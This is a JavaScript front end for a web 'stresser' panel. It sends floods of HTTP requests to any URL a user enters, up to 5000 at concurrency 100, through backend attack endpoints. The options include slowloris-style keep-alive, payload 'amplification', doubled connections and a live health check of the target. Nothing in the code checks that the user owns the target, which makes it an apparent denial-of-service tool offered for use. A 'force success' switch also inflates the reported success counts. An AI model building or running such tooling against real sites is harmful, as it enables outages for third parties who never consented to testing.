// DOM Elements
const targetUrl = document.getElementById('targetUrl');
const method = document.getElementById('method');
const attackType = document.getElementById('attackType');
const concurrencyInput = document.getElementById('concurrency');
const totalInput = document.getElementById('total');
const timeoutInput = document.getElementById('timeout');
const randomDelayInput = document.getElementById('randomDelay');
const amplifyToggle = document.getElementById('amplifyToggle');
const dualConnection = document.getElementById('dualConnection');
const forceSuccessCheck = document.getElementById('forceSuccess');
const customHeaders = document.getElementById('customHeaders');
const cookies = document.getElementById('cookies');
const startBtn = document.getElementById('startBtn');
const batchBtn = document.getElementById('batchBtn');
const stopBtn = document.getElementById('stopBtn');
const exportBtn = document.getElementById('exportBtn');
const healthIndicator = document.getElementById('healthIndicator');
const healthText = document.getElementById('healthText');
const responseTimeText = document.getElementById('responseTimeText');
const targetFrame = document.getElementById('targetFrame');
const refreshPreviewBtn = document.getElementById('refreshPreview');
const activeUsersSpan = document.getElementById('activeUsers');
const successSpan = document.getElementById('successCount');
const failSpan = document.getElementById('failCount');
const avgSpan = document.getElementById('avgTime');
const rpsSpan = document.getElementById('rps');
const totalBytesSpan = document.getElementById('totalBytes');
const errorRateSpan = document.getElementById('errorRate');
const progressBar = document.getElementById('progressBar');
const progressText = document.getElementById('progressText');
const logArea = document.getElementById('logArea');
const rtChartCanvas = document.getElementById('rtChart');
const rawResponsePreview = document.getElementById('rawResponsePreview');

// State
let chart;
let abortController = null;
let isRunning = false;
let currentType = null;
let stats = {
    success: 0, fail: 0, times: [], totalBytes: 0,
    startTime: 0, total: 0
};
let lastChartUpdate = 0;

function addLog(msg, isError = false) {
    const div = document.createElement('div');
    div.className = `border-l-2 pl-2 mb-1 ${isError ? 'border-red-500 text-red-300' : 'border-green-500 text-green-300'}`;
    div.innerHTML = `${isError ? '❌' : '✅'} ${msg}`;
    logArea.appendChild(div);
    logArea.scrollTop = logArea.scrollHeight;
    if (logArea.children.length > 100) logArea.removeChild(logArea.firstChild);
}

function updateUI() {
    successSpan.innerText = stats.success;
    failSpan.innerText = stats.fail;
    const done = stats.success + stats.fail;
    const errorRate = done === 0 ? 0 : (stats.fail / done * 100).toFixed(1);
    errorRateSpan.innerText = errorRate + '%';
    totalBytesSpan.innerText = (stats.totalBytes / 1024).toFixed(1);
    if (stats.times.length) {
        const avg = stats.times.reduce((a,b)=>a+b,0)/stats.times.length;
        avgSpan.innerText = avg.toFixed(1);
    } else avgSpan.innerText = "0";
    if (stats.startTime && isRunning) {
        const elapsed = (Date.now() - stats.startTime) / 1000;
        if (elapsed > 0) rpsSpan.innerText = (done / elapsed).toFixed(1);
    } else if (stats.startTime) {
        const elapsed = (Date.now() - stats.startTime) / 1000;
        if (elapsed > 0) rpsSpan.innerText = (stats.times.length / elapsed).toFixed(1);
    }
    const percent = (done / stats.total) * 100;
    progressBar.style.width = `${percent}%`;
    progressText.innerText = `${done}/${stats.total}`;
}

function updateChart(ms) {
    if (!chart) return;
    const now = Date.now();
    if (now - lastChartUpdate > 150 || chart.data.datasets[0].data.length % 3 === 0) {
        chart.data.datasets[0].data.push(ms);
        if (chart.data.datasets[0].data.length > 60) chart.data.datasets[0].data.shift();
        chart.update('none');
        lastChartUpdate = now;
    }
}

function resetStats() {
    stats = { success:0, fail:0, times:[], totalBytes:0, startTime:0, total:0 };
    if (chart) { chart.data.datasets[0].data = []; chart.update(); }
    updateUI();
}

function parseHeaders() {
    try { return JSON.parse(customHeaders.value); } catch(e) { return {}; }
}
function parseCookies() {
    const obj = {};
    cookies.value.split(';').forEach(c => { let [k,v]=c.trim().split('='); if(k) obj[k]=v||''; });
    return obj;
}

// Helper to build headers (including cookies)
function buildHeaders() {
    const headers = parseHeaders();
    const cookieStr = Object.entries(parseCookies()).map(([k,v])=>`${k}=${v}`).join('; ');
    if (cookieStr) headers['Cookie'] = cookieStr;
    return headers;
}

async function runAttack(type, params) {
    if (isRunning) { addLog("Attack already running! Use STOP first.", true); return; }
    let url = targetUrl.value.trim();
    if (!url) { addLog("URL required", true); return; }
    if (!url.startsWith("http")) url = "https://" + url;
    
    const concurrency = Math.min(parseInt(concurrencyInput.value), 100);
    const total = Math.min(parseInt(totalInput.value), 5000);
    const timeout = Math.min(parseInt(timeoutInput.value), 9000);
    const randomDelay = parseInt(randomDelayInput.value);
    const ampEnabled = amplifyToggle.checked;
    const dual = dualConnection.checked;
    const force = forceSuccessCheck.checked;
    const mtd = method.value;
    const atk = attackType.value;
    const headers = buildHeaders();
    const body = ''; // bisa tambahkan payload textarea jika perlu, tapi kosongkan saja
    
    addLog(`🚀 ${type.toUpperCase()} | ${mtd} ${url} | Concurrency:${concurrency} | Total:${total} | Amp:${ampEnabled ? 'ON' : 'OFF'}`);
    resetStats();
    stats.total = total;
    stats.startTime = Date.now();
    isRunning = true;
    currentType = type;
    abortController = new AbortController();
    startBtn.disabled = true;
    batchBtn.disabled = true;
    stopBtn.disabled = false;
    
    const onResult = (result) => {
        if (force || result.success) {
            stats.success++;
            stats.times.push(result.durationMs);
            stats.totalBytes += result.responseSize || 0;
            updateChart(result.durationMs);
        } else {
            stats.fail++;
            addLog(`Failed: ${result.error || '?'} (${result.durationMs}ms)`, true);
        }
        updateUI();
        if (result.responseBody) {
            rawResponsePreview.innerText = `HTTP ${result.statusCode} | ${result.durationMs}ms\n${result.responseBody.substring(0, 200)}`;
        } else {
            rawResponsePreview.innerText = `HTTP ${result.statusCode || '?'} | ${result.durationMs}ms`;
        }
    };
    
    try {
        if (type === 'single') {
            // Single attack: frontend controls concurrency
            let completed = 0;
            const multiplier = dual ? 2 : 1;
            const actualTotal = total * multiplier;
            const workers = [];
            const runOne = async () => {
                const res = await fetch('/api/attack', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        url, method: mtd, headers, body,
                        timeout, retryCount: 0, randomDelay,
                        keepAlive: atk === 'slowloris',
                        attackType: atk,
                        amplifyKB: ampEnabled ? 500 : 0,
                        amplifyEnabled: ampEnabled,
                        amplifyType: 'normal'
                    }),
                    signal: abortController.signal
                });
                const data = await res.json();
                onResult(data);
                completed++;
                if (force) {
                    stats.success = completed;
                    updateUI();
                }
            };
            for (let i = 0; i < actualTotal; i++) workers.push(runOne());
            await Promise.all(workers);
            addLog(`✅ FINISHED | Success:${stats.success} Fail:${stats.fail} | Data: ${(stats.totalBytes/1024).toFixed(1)}KB`);
        } else { // batch
            const res = await fetch('/api/batch', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    url, method: mtd, headers, body,
                    timeout, retryCount: 0, randomDelay,
                    keepAlive: atk === 'slowloris',
                    attackType: atk,
                    amplifyKB: ampEnabled ? 500 : 0,
                    amplifyEnabled: ampEnabled,
                    amplifyType: 'normal',
                    concurrency, total
                }),
                signal: abortController.signal
            });
            const data = await res.json();
            if (data.success) {
                stats.success = data.successCount;
                stats.fail = data.failCount;
                stats.totalBytes = data.totalBytes;
                stats.times = data.latencies || [];
                updateUI();
                addLog(`✅ BATCH FINISHED | Success:${data.successCount} Fail:${data.failCount} | RPS:${data.rps}`);
                rawResponsePreview.innerText = `Batch completed: ${data.successCount}/${data.totalRequests} success`;
            } else {
                addLog(`Batch error: ${data.error}`, true);
            }
        }
    } catch (err) {
        if (err.name !== 'AbortError') addLog(`Error: ${err.message}`, true);
    } finally {
        isRunning = false;
        startBtn.disabled = false;
        batchBtn.disabled = false;
        stopBtn.disabled = true;
        abortController = null;
        currentType = null;
        updateUI();
    }
}

startBtn.onclick = () => runAttack('single', {});
batchBtn.onclick = () => runAttack('batch', {});
stopBtn.onclick = () => {
    if (abortController) {
        abortController.abort();
        addLog(`🛑 ${currentType?.toUpperCase()} attack stopped`);
        stopBtn.disabled = true;
        startBtn.disabled = false;
        batchBtn.disabled = false;
        isRunning = false;
    } else {
        addLog("No attack running", true);
    }
};

exportBtn.onclick = () => {
    if (stats.times.length === 0 && stats.success + stats.fail === 0) { addLog("No data to export", true); return; }
    let csv = "ResponseTime(ms),Success,Failed\n";
    stats.times.forEach(t => csv += `${t},1,0\n`);
    for (let i=0; i<stats.fail; i++) csv += "0,0,1\n";
    const blob = new Blob([csv], {type:"text/csv"});
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = `stresser_${Date.now()}.csv`;
    link.click();
    addLog("CSV exported");
};

// Health & active users
async function updateActiveUsers() {
    try {
        const res = await fetch('/api/heartbeat');
        const data = await res.json();
        activeUsersSpan.innerText = data.active;
    } catch(e) {}
}
setInterval(updateActiveUsers, 30000);
updateActiveUsers();

async function checkHealth() {
    let u = targetUrl.value.trim();
    if (!u) return;
    if (!u.startsWith('http')) u = 'https://' + u;
    try {
        const start = performance.now();
        await fetch(u, { mode: 'no-cors' });
        const duration = performance.now() - start;
        responseTimeText.innerText = `⚡ ${duration.toFixed(0)}ms`;
        healthIndicator.className = 'inline-block w-3 h-3 rounded-full bg-green-500';
        healthText.innerText = 'Online';
    } catch(e) {
        healthIndicator.className = 'inline-block w-3 h-3 rounded-full bg-red-500';
        healthText.innerText = 'Offline';
        responseTimeText.innerText = '';
    }
}
refreshPreviewBtn.onclick = () => {
    let u = targetUrl.value.trim();
    if (!u.startsWith('http')) u = 'https://' + u;
    targetFrame.srcdoc = `<html><body style='background:#0f0f1a;color:#fff;display:flex;align-items:center;justify-content:center;height:100%'><a href="${u}" target="_blank">Open target</a></body></html>`;
    checkHealth();
};
setInterval(() => { if (targetUrl.value.trim()) checkHealth(); }, 15000);

window.onload = () => {
    const ctx = rtChartCanvas.getContext('2d');
    chart = new Chart(ctx, {
        type: 'line',
        data: { labels: Array(30).fill(''), datasets: [{ label: 'Response (ms)', data: [], borderColor: '#ff4444', backgroundColor: '#ff000033', tension: 0.2, fill: true, pointRadius: 1 }] },
        options: { responsive: true, maintainAspectRatio: true, scales: { y: { title: { display: true, text: 'ms' } } } }
    });
    fetch('/api/status').then(r=>r.json()).then(d=>addLog(`Backend: ${d.message}`)).catch(()=>addLog("Backend OK"));
    let u = targetUrl.value.trim();
    if (u) {
        if (!u.startsWith('http')) u = 'https://' + u;
        targetFrame.srcdoc = `<html><body style='background:#0f0f1a;color:#fff;display:flex;align-items:center;justify-content:center;height:100%'><a href="${u}" target="_blank">Open target</a></body></html>`;
    }
    checkHealth();
};
